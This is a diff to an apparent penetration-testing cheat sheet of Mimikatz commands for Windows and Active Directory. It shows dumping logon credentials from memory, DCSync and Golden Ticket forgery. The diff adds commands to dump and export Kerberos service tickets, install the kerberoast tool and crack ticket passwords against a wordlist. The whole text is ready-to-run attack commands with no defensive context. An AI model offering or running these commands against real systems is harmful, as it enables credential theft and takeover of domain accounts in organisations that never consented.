@@ -7,8 +7,19 @@ Dump all credentials in memory on Windows system:
 mimikatz # privilege::debug
 mimikatz # sekurlsa::logonPasswords
 
+Dump all TGT and Service Tickets:
+sekurlsa::tickets
+
 DCSync attack on Windows Domain:
 mimikatz # lsadump::dcsync /user:<username> (ex..krbtgt)
 
 Golden Ticket Attack:
 mimikatz # kerberos::golden /domain:<domain.name> /sid:<username SID> /rc4:<NTLM Hash> /user:<username> /ptt
+
+Download Service Ticket:
+kerberos::list /export
+
+**You can use the 'Kerberoast' tool to try and bruteforce password (Hashcat or John work as well):
+sudo apt update && sudo apt install kerberoast
+
+python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt <servcie@ticket.kirbi>
